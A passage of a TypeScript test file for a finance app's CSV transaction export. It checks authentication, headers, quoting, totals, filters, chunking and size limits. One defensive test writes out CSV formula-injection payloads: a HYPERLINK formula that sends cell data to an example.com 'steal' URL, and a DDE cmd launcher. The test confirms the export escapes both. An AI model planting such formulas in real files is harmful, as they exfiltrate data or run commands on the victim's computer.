import { createExecutionContext, waitOnExecutionContext } from 'cloudflare:test'
import { env, exports } from 'cloudflare:workers'
import { beforeEach, describe, expect, it } from 'vitest'
import worker from './index'
import {
  centsToDecimal,
  chunkEnd,
  type Chunk,
  EXPORT_CHUNK_BYTES,
  EXPORT_CHUNK_ROWS,
  EXPORT_HEADER,
  EXPORT_MAX_BYTES,
  EXPORT_MAX_ROWS,
  exportChunk,
  exportFilename,
} from './transaction-export'

// Seam 1: the CSV export of the Transactions (ticket 19), through the Worker's exported handler as the local-development
// Admin or a read-only Member (the dev identity cookie is honoured on localhost only). Everything below is made up.
// The same filters as the list are tested against the list itself, so the two can't drift apart.
const origin = 'http://localhost:5173'
type Who = 'admin' | 'member'

const request = (query: string, who: Who = 'member') =>
  exports.default.fetch(new Request(`${origin}/api/transactions/export.csv${query}`, { headers: { Cookie: `fernledger_dev_as=${who}` } }))

/**
 * Calls the Worker's handler with `db` standing in for D1, to count its queries or make one fail. Called directly, not through
 * `exports.default.fetch`, because the test changes the Worker's env (CODING_STANDARDS.md: Tests).
 */
async function requestWith(db: D1Database, query = '') {
  const ctx = createExecutionContext()
  const res = await worker.fetch!(new Request(`${origin}/api/transactions/export.csv${query}`, { headers: { Cookie: 'fernledger_dev_as=member' } }) as never, { ...env, DB: db }, ctx)
  await waitOnExecutionContext(ctx)
  return res
}

/** D1 that counts the statements prepared on it, and lets `onPrepare` throw to make one fail. */
function watchedDb(onPrepare: (callNumber: number) => void = () => {}) {
  const watched = { prepared: 0 }
  const db = new Proxy(env.DB, {
    get(target, property) {
      if (property === 'prepare') {
        return (sql: string) => {
          watched.prepared += 1
          onPrepare(watched.prepared)
          return target.prepare(sql)
        }
      }
      const value = Reflect.get(target, property)
      return typeof value === 'function' ? value.bind(target) : value
    },
  })
  return { db, watched }
}

/** RFC 4180: records of cells, where a quoted cell may hold commas, doubled quotes and line breaks. */
function parseCsv(text: string): string[][] {
  const records: string[][] = []
  let record: string[] = []
  let cell = ''
  let quoted = false
  for (let i = 0; i < text.length; i++) {
    const c = text[i]!
    if (quoted) {
      if (c !== '"') cell += c
      else if (text[i + 1] === '"') {
        cell += '"'
        i++
      } else quoted = false
    } else if (c === '"' && cell === '') quoted = true
    else if (c === ',') {
      record.push(cell)
      cell = ''
    } else if (c === '\r' && text[i + 1] === '\n') {
      record.push(cell)
      records.push(record)
      record = []
      cell = ''
      i++
    } else cell += c
  }
  if (cell !== '' || record.length) {
    record.push(cell)
    records.push(record)
  }
  return records
}

type Exported = { status: number; headers: Headers; bytes: Uint8Array; text: string; records: string[][]; header: string[]; rows: string[][]; totals: string[][] }
/** The file split into its parts: the heading, one record per Transaction, and what follows the blank line. */
async function download(query = '', who: Who = 'member'): Promise<Exported> {
  const res = await request(query, who)
  const bytes = new Uint8Array(await res.arrayBuffer())
  const bom = bytes[0] === 0xef && bytes[1] === 0xbb && bytes[2] === 0xbf
  const text = new TextDecoder().decode(bytes.subarray(bom ? 3 : 0))
  const records = parseCsv(text)
  const blank = records.findIndex((r) => r.length === 1 && r[0] === '')
  return { status: res.status, headers: res.headers, bytes, text, records, header: records[0] ?? [], rows: records.slice(1, blank < 0 ? undefined : blank), totals: blank < 0 ? [] : records.slice(blank + 1) }
}
const column = (name: (typeof EXPORT_HEADER)[number]) => EXPORT_HEADER.indexOf(name)
const descriptions = (file: Exported) => file.rows.map((r) => r[column('Description')])

type Added = {
  date?: string
  amountCents?: number
  description?: string
  note?: string | null
  overrideCategory?: number | null
  /** The Category a Rule gave it when it was imported. */
  ruleCategory?: number | null
  accountId?: number
  bankType?: string
  bankMemo?: string
  bankReference?: string | null
  /** What Sync supplies and a bank file does not. */
  counterparty?: string | null
  particulars?: string | null
  paymentCode?: string | null
  cardSuffix?: string | null
}
let savings = 0
let cheque = 0
let n = 0
/** Adds a made-up Transaction and returns its ID. Dated 1 October 2026 unless `date` says otherwise. */
async function add(t: Added = {}) {
  n += 1
  const { meta } = await env.DB.prepare(
    `INSERT INTO transactions (account_id, date, amount_cents, description, bank_type, bank_memo, bank_reference, source, note, override_category, rule_category,
                               bank_counterparty_account, bank_particulars, bank_payment_code, bank_card_suffix)
     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
  )
    .bind(
      t.accountId ?? savings,
      t.date ?? '2026-10-01',
      t.amountCents ?? -1000,
      t.description ?? `EXAMPLE SHOP ${n}`,
      t.bankType ?? 'EFTPOS',
      t.bankMemo ?? '',
      t.bankReference ?? null,
      'import',
      t.note ?? null,
      t.overrideCategory ?? null,
      t.ruleCategory ?? null,
      t.counterparty ?? null,
      t.particulars ?? null,
      t.paymentCode ?? null,
      t.cardSuffix ?? null,
    )
    .run()
  return meta.last_row_id
}
const addCategory = async (name: string) => (await env.DB.prepare('INSERT INTO categories (name) VALUES (?) RETURNING id').bind(name).first<{ id: number }>())!.id

beforeEach(async () => {
  await env.DB.batch(['transactions', 'accounts', 'change_log', 'categories'].map((table) => env.DB.prepare(`DELETE FROM ${table}`)))
  savings = (await env.DB.prepare("INSERT INTO accounts (account_number, name) VALUES ('99-9999-9999999-99', 'Example savings') RETURNING id").first<{ id: number }>())!.id
  cheque = (await env.DB.prepare("INSERT INTO accounts (account_number, name) VALUES ('99-9999-9999999-98', 'Example cheque') RETURNING id").first<{ id: number }>())!.id
  n = 0
})

/** Cents and how the file writes them: whole dollars and two digits of cents, with a minus sign for money out. */
const AMOUNTS: [number, string][] = [
  [-123456, '-1234.56'],
  [123456, '1234.56'],
  [-5, '-0.05'],
  [5, '0.05'],
  [-100, '-1.00'],
  [100, '1.00'],
  [-99, '-0.99'],
  [99, '0.99'],
  [1, '0.01'],
  [0, '0.00'],
  [100_000_000, '1000000.00'],
  [-9_007_199_254_740_991, '-90071992547409.91'],
]

describe('centsToDecimal', () => {
  it.each(AMOUNTS)('writes %i cents as %s', (cents, text) => {
    expect(centsToDecimal(cents)).toBe(text)
  })
})

describe('exportFilename', () => {
  it('has the dates asked for and nothing else', () => {
    expect(exportFilename({ uncategorised: false, from: '2026-01-01', to: '2026-03-31' })).toBe('fernledger-transactions-2026-01-01-to-2026-03-31.csv')
    expect(exportFilename({ uncategorised: false, from: '2026-01-01' })).toBe('fernledger-transactions-from-2026-01-01.csv')
    expect(exportFilename({ uncategorised: false, to: '2026-03-31' })).toBe('fernledger-transactions-to-2026-03-31.csv')
    expect(exportFilename({ uncategorised: false })).toBe('fernledger-transactions-all.csv')
  })

  it('names no Account, Category or text, whatever was searched for', () => {
    expect(exportFilename({ uncategorised: true, accountId: 2, categoryId: 3, text: 'secret', from: '2026-01-01', to: '2026-01-31' })).toBe('fernledger-transactions-2026-01-01-to-2026-01-31.csv')
  })
})

describe('who can export', () => {
  it('lets a Member, who cannot change anything, and the Admin download the file', async () => {
    await add()
    for (const who of ['member', 'admin'] as const) {
      const file = await download('', who)
      expect(file.status, who).toBe(200)
      expect(file.rows, who).toHaveLength(1)
    }
  })

  it('refuses someone who is not signed in, and sends no Transactions', async () => {
    await add({ description: 'EXAMPLE PRIVATE SHOP' })
    // Off localhost the dev identity is not honoured, so with or without its cookie nobody is signed in.
    const signedOut: Record<string, string>[] = [{}, { Cookie: 'fernledger_dev_as=admin' }]
    for (const headers of signedOut) {
      const res = await exports.default.fetch(new Request('https://app.test/api/transactions/export.csv', { headers }))
      expect(res.status).toBe(401)
      expect(res.headers.get('Content-Disposition')).toBeNull()
      expect(await res.text()).not.toContain('EXAMPLE PRIVATE SHOP')
    }
  })
})

describe('the response', () => {
  it('is a download of UTF-8 CSV that is never kept, named by its dates', async () => {
    await add()

    const { headers } = await download('?from=2026-10-01&to=2026-10-31')

    expect(headers.get('Content-Type')).toBe('text/csv; charset=utf-8')
    expect(headers.get('Content-Disposition')).toBe('attachment; filename="fernledger-transactions-2026-10-01-to-2026-10-31.csv"')
    expect(headers.get('Cache-Control')).toBe('no-store')
    expect(headers.get('X-Content-Type-Options')).toBe('nosniff')
  })

  it('starts with a byte order mark, so Excel reads macrons as UTF-8, and ends each line with CRLF', async () => {
    await add({ description: 'EXAMPLE CAFE WHĀNGĀREI' })

    const file = await download()

    expect([...file.bytes.subarray(0, 3)]).toEqual([0xef, 0xbb, 0xbf])
    expect(file.text.startsWith('Date,')).toBe(true)
    expect(file.text.endsWith('\r\n')).toBe(true)
    expect(file.text.replaceAll('\r\n', '')).not.toMatch(/[\r\n]/)
    expect(descriptions(file)).toEqual(['EXAMPLE CAFE WHĀNGĀREI'])
  })

  it('has the heading, then the Transactions oldest first with their effective Category and every bank field', async () => {
    const fuel = await addCategory('Fuel')
    await add({
      date: '2026-10-03',
      amountCents: -4550,
      description: 'EXAMPLE FUEL STOP',
      overrideCategory: fuel,
      note: 'Trip to the lake',
      bankType: 'EFTPOS',
      bankMemo: 'EXAMPLE FUEL STOP 12',
      bankReference: 'REF 77',
      counterparty: '99-9999-9999999-97',
      particulars: 'PART',
      paymentCode: 'CODE',
      cardSuffix: '1234',
    })
    await add({ date: '2026-10-01', amountCents: 250000, description: 'EXAMPLE WAGES', accountId: cheque, bankType: 'DIRECT CREDIT' })

    const file = await download()

    expect(file.header).toEqual([
      'Date',
      'Account',
      'Description',
      'Category',
      'Note',
      'Amount',
      'Bank type',
      'Bank memo',
      'Bank reference',
      'Bank counterparty account',
      'Bank particulars',
      'Bank payment code',
      'Bank card suffix',
    ])
    // A bank file has none of the counterparty account, particulars, code or card, so those cells are empty; they are still columns.
    expect(file.rows).toEqual([
      ['2026-10-01', 'Example cheque', 'EXAMPLE WAGES', 'Uncategorised', '', '2500.00', 'DIRECT CREDIT', '', '', '', '', '', ''],
      ['2026-10-03', 'Example savings', 'EXAMPLE FUEL STOP', 'Fuel', 'Trip to the lake', '-45.50', 'EFTPOS', 'EXAMPLE FUEL STOP 12', 'REF 77', '99-9999-9999999-97', 'PART', 'CODE', '1234'],
    ])
  })

  it('writes the same Category as the list for an Override, a Rule, neither, and a removed Category', async () => {
    const [override, rule, removed] = [await addCategory('Fuel'), await addCategory('Groceries'), await addCategory('Old category')]
    await env.DB.prepare("UPDATE categories SET removed_at = '2026-10-02T00:00:00.000Z' WHERE id = ?").bind(removed).run()
    await add({ date: '2026-10-01', description: 'EXAMPLE OVERRIDE AND RULE', overrideCategory: override, ruleCategory: rule })
    await add({ date: '2026-10-02', description: 'EXAMPLE RULE ONLY', ruleCategory: rule })
    await add({ date: '2026-10-03', description: 'EXAMPLE NEITHER' })
    await add({ date: '2026-10-04', description: 'EXAMPLE REMOVED OVERRIDE FALLS TO RULE', overrideCategory: removed, ruleCategory: rule })
    await add({ date: '2026-10-05', description: 'EXAMPLE REMOVED RULE', ruleCategory: removed })
    await add({ date: '2026-10-06', description: 'EXAMPLE REMOVED OVERRIDE ONLY', overrideCategory: removed })

    const file = await download()

    expect(file.rows.map((r) => [r[column('Description')], r[column('Category')]])).toEqual([
      ['EXAMPLE OVERRIDE AND RULE', 'Fuel'],
      ['EXAMPLE RULE ONLY', 'Groceries'],
      ['EXAMPLE NEITHER', 'Uncategorised'],
      ['EXAMPLE REMOVED OVERRIDE FALLS TO RULE', 'Groceries'],
      ['EXAMPLE REMOVED RULE', 'Uncategorised'],
      ['EXAMPLE REMOVED OVERRIDE ONLY', 'Uncategorised'],
    ])
    // And the page's list, which the file must never disagree with, says the same.
    const res = await exports.default.fetch(new Request(`${origin}/api/transactions?sort=date&dir=asc&limit=200`, { headers: { Cookie: 'fernledger_dev_as=member' } }))
    const list = ((await res.json()) as { transactions: { categoryName: string | null }[] }).transactions.map((t) => t.categoryName ?? 'Uncategorised')
    expect(file.rows.map((r) => r[column('Category')])).toEqual(list)
  })

  it('orders by date, then by ID, whatever order they were added in', async () => {
    await add({ date: '2026-10-05', description: 'EXAMPLE LATE' })
    await add({ date: '2026-10-02', description: 'EXAMPLE SECOND A' })
    await add({ date: '2026-10-02', description: 'EXAMPLE SECOND B' })
    await add({ date: '2026-10-01', description: 'EXAMPLE FIRST' })
    await add({ date: '2026-10-05', description: 'EXAMPLE LATE TOO' })

    expect(descriptions(await download())).toEqual(['EXAMPLE FIRST', 'EXAMPLE SECOND A', 'EXAMPLE SECOND B', 'EXAMPLE LATE', 'EXAMPLE LATE TOO'])
  })

  it('is just the heading and zero totals when nothing matches', async () => {
    await add()

    const file = await download('?from=2020-01-01&to=2020-01-31')

    expect(file.rows).toEqual([])
    expect(file.totals).toEqual([['Totals'], ['Money in', '0.00'], ['Money out', '0.00'], ['Net', '0.00'], ['Transactions', '0']])
  })

  it('ignores the list\'s sort and paging: it is every match, oldest first', async () => {
    await add({ date: '2026-10-02', amountCents: -100, description: 'EXAMPLE B' })
    await add({ date: '2026-10-01', amountCents: -900, description: 'EXAMPLE A' })
    await add({ date: '2026-10-03', amountCents: -500, description: 'EXAMPLE C' })

    expect(descriptions(await download('?sort=amount&dir=desc&limit=1&offset=1&count=only'))).toEqual(['EXAMPLE A', 'EXAMPLE B', 'EXAMPLE C'])
  })
})

describe('amounts', () => {
  it.each(AMOUNTS)('writes %i cents as the unquoted number %s', async (cents, text) => {
    await add({ amountCents: cents, description: 'EXAMPLE SHOP' })

    const file = await download()

    expect(file.rows[0]![column('Amount')]).toBe(text)
    // Unquoted, so a spreadsheet reads a number; and not escaped, though money out starts with a minus sign.
    expect(file.text.split('\r\n')[1]).toContain(`,${text},`)
    expect(text).toMatch(/^-?\d+\.\d{2}$/)
  })
})

describe('cells that would run as a spreadsheet formula', () => {
  const LEADING = ['=', '+', '-', '@', '\t', '\r']

  it.each(LEADING)('puts an apostrophe before a Description starting with %j', async (lead) => {
    await add({ description: `${lead}EXAMPLE 1+1` })
    expect((await download()).rows[0]![column('Description')]).toBe(`'${lead}EXAMPLE 1+1`)
  })

  it.each(LEADING)('puts an apostrophe before a Note starting with %j', async (lead) => {
    await add({ note: `${lead}EXAMPLE 1+1` })
    expect((await download()).rows[0]![column('Note')]).toBe(`'${lead}EXAMPLE 1+1`)
  })

  it('escapes the whole formula a payee could send', async () => {
    await add({ description: '=HYPERLINK("https://example.com/steal?x="&A1,"Click")', note: '@SUM(1+1)*cmd|\' /C calc\'!A0' })

    const [row] = (await download()).rows

    expect(row![column('Description')]).toBe('\'=HYPERLINK("https://example.com/steal?x="&A1,"Click")')
    expect(row![column('Note')]).toBe('\'@SUM(1+1)*cmd|\' /C calc\'!A0')
  })

  it('escapes every text column: the Account, Category and each field the bank gave as well', async () => {
    const category = await addCategory('-Example category')
    await env.DB.prepare('UPDATE accounts SET name = ? WHERE id = ?').bind('+Example account', savings).run()
    await add({
      overrideCategory: category,
      bankType: '=TYPE',
      bankMemo: '@MEMO',
      bankReference: '+REF',
      counterparty: '-COUNTERPARTY',
      particulars: '=PARTICULARS',
      paymentCode: '@CODE',
      cardSuffix: '+CARD',
    })

    const [row] = (await download()).rows

    expect(row![column('Account')]).toBe("'+Example account")
    expect(row![column('Category')]).toBe("'-Example category")
    expect(row![column('Bank type')]).toBe("'=TYPE")
    expect(row![column('Bank memo')]).toBe("'@MEMO")
    expect(row![column('Bank reference')]).toBe("'+REF")
    expect(row![column('Bank counterparty account')]).toBe("'-COUNTERPARTY")
    expect(row![column('Bank particulars')]).toBe("'=PARTICULARS")
    expect(row![column('Bank payment code')]).toBe("'@CODE")
    expect(row![column('Bank card suffix')]).toBe("'+CARD")
  })

  it('leaves alone text that only has those characters after its first', async () => {
    await add({ description: 'EXAMPLE A=B+C-D@E', note: ' =after a space' })
    const [row] = (await download()).rows
    expect(row![column('Description')]).toBe('EXAMPLE A=B+C-D@E')
    expect(row![column('Note')]).toBe(' =after a space')
  })

  it('does not add a second apostrophe to text that already starts with one', async () => {
    await add({ description: "'EXAMPLE QUOTED" })
    expect((await download()).rows[0]![column('Description')]).toBe("'EXAMPLE QUOTED")
  })
})

describe('commas, quotes and line breaks', () => {
  it('are quoted, with quotes doubled, so a cell reads back as it was written', async () => {
    const description = 'EXAMPLE "BIG" SHOP, WELLINGTON'
    const note = 'Line one\nLine two\r\nLine three, with a comma and a "quote"'
    await add({ description, note })

    const file = await download()

    expect(file.rows[0]![column('Description')]).toBe(description)
    expect(file.rows[0]![column('Note')]).toBe(note)
    expect(file.rows[0]).toHaveLength(EXPORT_HEADER.length)
    expect(file.text).toContain('"EXAMPLE ""BIG"" SHOP, WELLINGTON"')
  })

  it.each([',', '"', '\n', '\r'])('are each enough, alone, to quote a cell: %j', async (special) => {
    await add({ description: `EXAMPLE X${special}Y` })

    const file = await download()

    expect(file.rows[0]![column('Description')]).toBe(`EXAMPLE X${special}Y`)
    expect(file.text).toContain(`,"EXAMPLE X${special === '"' ? '""' : special}Y",`)
  })

  it('are quoted after a formula\'s apostrophe, so the cell still starts with it', async () => {
    await add({ description: '=EXAMPLE, WITH A COMMA' })
    const file = await download()
    expect(file.rows[0]![column('Description')]).toBe("'=EXAMPLE, WITH A COMMA")
    expect(file.text).toContain('"\'=EXAMPLE, WITH A COMMA"')
  })

  it('are left out of cells that do not need them', async () => {
    await add({ description: 'EXAMPLE PLAIN SHOP' })
    expect((await download()).text).toContain(',EXAMPLE PLAIN SHOP,')
  })
})

describe('totals', () => {
  /** Dollars and cents as whole cents, by reading the text and not by arithmetic on floats. */
  const cents = (text: string) => {
    const [dollars, rest] = text.replace('-', '').split('.')
    return (text.startsWith('-') ? -1 : 1) * (Number(dollars) * 100 + Number(rest))
  }

  it('are Money in, Money out, Net and how many, under the Transactions after a blank line', async () => {
    await add({ amountCents: 250000 })
    await add({ amountCents: 1250 })
    await add({ amountCents: -4550 })
    await add({ amountCents: -99 })

    const file = await download()

    expect(file.totals).toEqual([['Totals'], ['Money in', '2512.50'], ['Money out', '-46.49'], ['Net', '2466.01'], ['Transactions', '4']])
    expect(file.text).toContain('\r\n\r\nTotals\r\n')
  })

  it('are in the second column, so adding up the Amount column still gives the Net', async () => {
    for (const amountCents of [250000, 1250, -4550, -99, 7, -12]) await add({ amountCents })

    const file = await download()

    const sum = file.records.reduce((total, r) => total + (/^-?\d+\.\d{2}$/.test(r[column('Amount')] ?? '') ? cents(r[column('Amount')]!) : 0), 0)
    expect(sum).toBe(cents(file.totals.find((r) => r[0] === 'Net')![1]!))
    for (const record of file.totals) expect(record.length, record.join()).toBeLessThanOrEqual(2)
  })

  it('count only the Transactions the filters keep', async () => {
    await add({ amountCents: 1000, accountId: savings })
    await add({ amountCents: -300, accountId: cheque })
    await add({ amountCents: -200, accountId: cheque })

    const file = await download(`?accountId=${cheque}`)

    expect(file.totals).toEqual([['Totals'], ['Money in', '0.00'], ['Money out', '-5.00'], ['Net', '-5.00'], ['Transactions', '2']])
  })

  it('add up across chunks', async () => {
    const count = EXPORT_CHUNK_ROWS * 2 + 37
    await env.DB.prepare(
      `WITH RECURSIVE seq(i) AS (SELECT 1 UNION ALL SELECT i + 1 FROM seq WHERE i < ${count})
       INSERT INTO transactions (account_id, date, amount_cents, description, source) SELECT ?, '2026-10-01', CASE WHEN i % 2 = 0 THEN 1001 ELSE -2 END, 'EXAMPLE ROW ' || i, 'import' FROM seq`,
    )
      .bind(savings)
      .run()

    const file = await download()

    const evens = Math.floor(count / 2)
    expect(file.rows).toHaveLength(count)
    expect(file.totals).toEqual([['Totals'], ['Money in', centsToDecimal(evens * 1001)], ['Money out', centsToDecimal(-2 * (count - evens))], ['Net', centsToDecimal(evens * 1001 - 2 * (count - evens))], ['Transactions', String(count)]])
  })
})

describe('the filters are the list\'s', () => {
  // Each case is a query string for the list. The export of it holds the same Transactions as the list's pages put together.
  let fuel = 0
  let groceries = 0
  beforeEach(async () => {
    fuel = await addCategory('Fuel')
    groceries = await addCategory('Groceries')
    await add({ date: '2026-09-30', description: 'EXAMPLE BEFORE', accountId: savings })
    await add({ date: '2026-10-01', description: 'EXAMPLE FIRST', accountId: savings, overrideCategory: fuel })
    await add({ date: '2026-10-01', description: 'EXAMPLE SAME DAY', accountId: cheque, overrideCategory: groceries, note: 'a needle in here' })
    await add({ date: '2026-10-15', description: 'EXAMPLE MIDDLE', accountId: cheque })
    await add({ date: '2026-10-31', description: 'EXAMPLE LAST', accountId: savings, overrideCategory: fuel })
    await add({ date: '2026-11-01', description: 'EXAMPLE AFTER', accountId: cheque })
  })

  const cases: [string, () => string][] = [
    ['nothing', () => ''],
    ['an Account', () => `?accountId=${cheque}`],
    ['a Category', () => `?categoryId=${fuel}`],
    ['Uncategorised', () => '?uncategorised=true'],
    ['a date range, both ends included', () => '?from=2026-10-01&to=2026-10-31'],
    ['only a from date', () => '?from=2026-10-15'],
    ['only a to date', () => '?to=2026-10-01'],
    ['text, whatever the capitals, in a Note', () => '?text=NEEDLE'],
    ['text in a description', () => '?text=example%20mid'],
    ['an Account, a date range and text together', () => `?accountId=${cheque}&from=2026-10-01&to=2026-11-01&text=example`],
    ['a Category and an Account', () => `?categoryId=${fuel}&accountId=${savings}`],
    ['Uncategorised and a date range', () => '?uncategorised=true&from=2026-10-01&to=2026-10-31'],
    ['blank text', () => '?text=%20%20'],
    ['an Account with nothing in it', () => '?accountId=99999'],
  ]

  it.each(cases)('keeps what the list keeps for %s', async (_name, query) => {
    const q = query()
    const asked = new URLSearchParams(q)
    asked.set('sort', 'date')
    asked.set('dir', 'asc')
    asked.set('limit', '200')
    const res = await exports.default.fetch(new Request(`${origin}/api/transactions?${asked}`, { headers: { Cookie: 'fernledger_dev_as=member' } }))
    const list = ((await res.json()) as { transactions: { description: string }[] }).transactions.map((t) => t.description)

    expect(descriptions(await download(q))).toEqual(list)
  })

  it('keeps something for each case that is not nothing, so the comparison above means something', async () => {
    const counts = await Promise.all(cases.map(async ([, query]) => (await download(query())).rows.length))
    expect(counts).toEqual([6, 3, 2, 3, 4, 3, 3, 1, 1, 3, 2, 1, 6, 0])
  })
})

describe('a request it refuses', () => {
  it.each([
    ['?accountId=abc', 'accountId'],
    ['?accountId=0', 'accountId'],
    ['?categoryId=-1', 'categoryId'],
    ['?uncategorised=yes', 'uncategorised'],
    ['?categoryId=1&uncategorised=true', 'categoryId'],
    ['?from=2026-02-30', 'from'],
    ['?to=not-a-date', 'to'],
    ['?from=1999-12-31', 'from'],
    ['?from=2026-10-31&to=2026-10-01', 'to'],
    [`?text=${'x'.repeat(101)}`, 'text'],
    ['?from=2026-01-01&from=2026-01-02', 'from'],
  ])('%s is a 400 that names %s and nothing else', async (query, field) => {
    await add({ description: 'EXAMPLE PRIVATE SHOP' })

    const res = await request(query)

    expect(res.status).toBe(400)
    expect(res.headers.get('Content-Disposition')).toBeNull()
    expect(await res.json()).toEqual({ error: 'Invalid request', field })
  })
})


/** `count` Transactions, seven to a day from 1 January 2020, in the order they will come out. */
const addMany = (count: number) =>
  env.DB.prepare(
    `WITH RECURSIVE seq(i) AS (SELECT 1 UNION ALL SELECT i + 1 FROM seq WHERE i < ${count})
     INSERT INTO transactions (account_id, date, amount_cents, description, source) SELECT ?, date('2020-01-01', '+' || (i / 7) || ' days'), -100, 'EXAMPLE ROW ' || i, 'import' FROM seq`,
  )
    .bind(savings)
    .run()
const noteOf = (file: Exported) => file.records.find((r) => r[0]?.startsWith('Only the first'))

describe('a long history', () => {
  it('is exported whole across chunks, in order, with none repeated or missed where a chunk ends part-way through a day', async () => {
    const count = EXPORT_CHUNK_ROWS * 3 + 5
    expect(EXPORT_CHUNK_ROWS % 7).not.toBe(0)
    await addMany(count)

    const file = await download()

    expect(descriptions(file)).toEqual(Array.from({ length: count }, (_, i) => `EXAMPLE ROW ${i + 1}`))
    expect(noteOf(file)).toBeUndefined()
  })

  it('has every Transaction when exactly the most is asked for, and says nothing about a limit', async () => {
    await addMany(EXPORT_MAX_ROWS)

    const file = await download()

    expect(file.rows).toHaveLength(EXPORT_MAX_ROWS)
    expect(noteOf(file)).toBeUndefined()
    expect(file.totals).toContainEqual(['Transactions', String(EXPORT_MAX_ROWS)])
  })

  it('stops at the most it will write, the oldest first, and says so after the totals', async () => {
    await addMany(EXPORT_MAX_ROWS + 1)

    const file = await download()

    expect(file.rows).toHaveLength(EXPORT_MAX_ROWS)
    expect(descriptions(file).at(-1)).toBe(`EXAMPLE ROW ${EXPORT_MAX_ROWS}`)
    expect(file.totals).toContainEqual(['Transactions', String(EXPORT_MAX_ROWS)])
    expect(file.totals).toContainEqual(['Money out', centsToDecimal(-100 * EXPORT_MAX_ROWS)])
    expect(file.records.at(-1)).toEqual([`Only the first ${EXPORT_MAX_ROWS.toLocaleString('en-NZ')} Transactions are in this file, and more match. The totals cover only those. Narrow the dates or filters, then export again.`])
  })

  it('asks D1 for the chunks and one more query to find out whether there was more, well inside the 50 an invocation gets (ADR 0004)', async () => {
    await addMany(EXPORT_MAX_ROWS + 1)
    const { db, watched } = watchedDb()

    const res = await requestWith(db)

    expect(res.status).toBe(200)
    expect(watched.prepared).toBe(EXPORT_MAX_ROWS / EXPORT_CHUNK_ROWS + 1)
    expect(watched.prepared).toBeLessThanOrEqual(25)
  })

  it('is an error and no file when a later query fails, not a file that stops short and looks complete', async () => {
    await addMany(EXPORT_CHUNK_ROWS * 2 + 1)
    const { db, watched } = watchedDb((call) => {
      if (call === 2) throw new Error('D1 is unavailable')
    })

    const res = await requestWith(db)

    expect(res.status).toBe(500)
    expect(res.headers.get('Content-Disposition')).toBeNull()
    expect(res.headers.get('Content-Type')).toContain('application/json')
    const body = await res.text()
    expect(JSON.parse(body)).toEqual({ error: 'Something went wrong' })
    expect(body).not.toContain('EXAMPLE ROW')
    expect(watched.prepared).toBe(2)
  })
})

describe('the limits on bytes', () => {
  /** `chars` characters of a euro sign, which is three bytes in UTF-8, as SQL (`chars` is even). */
  const euros = (chars: number) => `replace(hex(zeroblob(${chars / 2})), '0', char(8364))`
  const bytesOf = (text: string) => new TextEncoder().encode(text).length
  /** `count` Transactions, seven to a day, each with a Note of `noteChars` euro signs. */
  const addLong = (count: number, noteChars: number) =>
    env.DB.prepare(
      `WITH RECURSIVE seq(i) AS (SELECT 1 UNION ALL SELECT i + 1 FROM seq WHERE i < ${count})
       INSERT INTO transactions (account_id, date, amount_cents, description, note, source)
       SELECT ?, date('2020-01-01', '+' || (i / 7) || ' days'), -100, 'EXAMPLE ROW ' || i, ${euros(noteChars)}, 'import' FROM seq`,
    )
      .bind(savings)
      .run()
  const firstChunk = async (limit = EXPORT_CHUNK_ROWS) => {
    const { sql, binds } = exportChunk({ uncategorised: false }, { date: '', id: 0 }, limit)
    return (await env.DB.prepare(sql).bind(...binds).first<Chunk>())!
  }

  it('cut a chunk that would be longer than one query should return, and the next chunk carries on from where it stopped', async () => {
    // 300 Transactions of about 1.5 KB each is 450 KB: more than a chunk, less than a file.
    await addLong(300, 500)

    const chunk = await firstChunk()
    expect(chunk.fetched).toBe(300)
    expect(chunk.n).toBeLessThan(300)
    expect(chunk.bytes).toBeLessThanOrEqual(EXPORT_CHUNK_BYTES)
    expect(bytesOf(chunk.body!) + 2).toBe(chunk.bytes) // the count in SQL is the real UTF-8 length, the last line having no line end after it

    const { db, watched } = watchedDb()
    const file = await (async () => {
      const res = await requestWith(db)
      expect(res.status).toBe(200)
      const records = parseCsv(await res.text())
      return records.slice(1, records.findIndex((r) => r.length === 1 && r[0] === ''))
    })()
    expect(file.map((r) => r[column('Description')])).toEqual(Array.from({ length: 300 }, (_, i) => `EXAMPLE ROW ${i + 1}`))
    expect(file.every((r) => r[column('Note')]!.length === 500)).toBe(true)
    expect(watched.prepared).toBe(2)
  })

  it('always take the first Transaction, however long, so a file can always move on', async () => {
    await addLong(3, 100_000) // each 300 KB: longer than a chunk may be

    const chunk = await firstChunk()

    expect(chunk.n).toBe(1)
    expect(chunk.fetched).toBe(3)
    expect(bytesOf(chunk.body!) + 2).toBe(chunk.bytes)
    expect(descriptions(await download())).toEqual(['EXAMPLE ROW 1', 'EXAMPLE ROW 2', 'EXAMPLE ROW 3'])
  })

  it('keep every field of the longest Transactions, in euro signs, inside a chunk well under the 2 MB D1 allows in one string', async () => {
    // Every text field, the Sync ones too (they have no length limit yet), 1,000 three-byte characters long, and a Category to match.
    const category = await addCategory('€'.repeat(40))
    const long = euros(1000)
    await env.DB.prepare('UPDATE accounts SET name = ? WHERE id = ?').bind('€'.repeat(60), savings).run()
    await env.DB.prepare(
      `WITH RECURSIVE seq(i) AS (SELECT 1 UNION ALL SELECT i + 1 FROM seq WHERE i < 100)
       INSERT INTO transactions (account_id, date, amount_cents, description, bank_type, bank_memo, bank_reference, note, override_category,
                                 bank_counterparty_account, bank_particulars, bank_payment_code, bank_card_suffix, source)
       SELECT ?, '2026-10-01', -9007199254740991, ${long}, ${long}, ${long}, ${long}, ${long}, ?, ${long}, ${long}, ${long}, ${long}, 'import' FROM seq`,
    )
      .bind(savings, category)
      .run()

    const chunk = await firstChunk()

    expect(chunk.fetched).toBe(100)
    expect(chunk.n).toBeGreaterThan(1)
    expect(chunk.n).toBeLessThan(100)
    expect(chunk.bytes).toBeLessThanOrEqual(EXPORT_CHUNK_BYTES)
    expect(chunk.bytes).toBeLessThan(2_000_000 / 4)
    expect(bytesOf(chunk.body!) + 2).toBe(chunk.bytes)
  })

  it('stop a file at about the most bytes it may have, and say so, though fewer Transactions than the most', async () => {
    // 600 Transactions of about 1.5 KB each is 900 KB: more than a file may have.
    await addLong(600, 500)
    const { db, watched } = watchedDb()

    const res = await requestWith(db)
    const bytes = new Uint8Array(await res.arrayBuffer())
    const records = parseCsv(new TextDecoder().decode(bytes.subarray(3)))

    expect(res.status).toBe(200)
    const rows = records.slice(1, records.findIndex((r) => r.length === 1 && r[0] === ''))
    expect(rows.length).toBeGreaterThan(EXPORT_MAX_BYTES / 2000)
    expect(rows.length).toBeLessThan(600)
    expect(bytes.length).toBeGreaterThanOrEqual(EXPORT_MAX_BYTES)
